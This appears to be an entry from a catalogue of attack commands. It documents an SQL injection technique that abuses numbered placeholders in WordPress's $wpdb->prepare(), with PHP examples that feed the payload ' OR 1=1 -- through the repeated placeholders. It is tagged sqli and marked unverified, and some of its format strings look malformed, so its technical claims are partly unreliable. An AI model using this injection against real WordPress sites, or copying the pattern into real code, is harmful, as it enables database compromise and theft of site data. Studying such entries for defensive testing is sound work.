---
id: cmd-multi-ph-sqli
data: '$wpdb->prepare("%1$%s%2$%s%2$%s %s %s", $input[''one''], $input[''two''])'
tags:
  - sqli
  - wordpress
type: command
output: null
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.588Z'
verified: false
validated: true
submitted: true
---
# multi-numbered-placeholder-inject

## Command

```php
$wpdb->prepare("%1$%s%2$%s%2$%s %s %s", $input['one'], $input['two'])
```

## Description

Illustrates advanced SQLi using PHP sprintf features in $wpdb->prepare() with multiple numbered placeholders and user input, enabling format string attacks if inputs are controlled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| %1$%s | First placeholder | Yes |
| %2$%s | Repeated second placeholder | Yes |
| $input['one'] | Empty or controlled value | Yes |
| $input['two'] | SQLi payload | Yes |

## Examples

### Basic Usage

```php
$input = ['one' => '', 'two' => "' OR 1=1 --"];
$wpdb->prepare("%1$%s%2$%s", $input['one'], $input['two']);
```

### Advanced Usage

```php
// Repeat placeholder for amplification
$wpdb->prepare("%1$%s%2$%s%2$%s", '', "payload");
```

## Expected Output

Injected SQL via second input if first is empty, breaking query structure, e.g., malformed SQL executing payload.

## Related

- [[Related Procedure]]
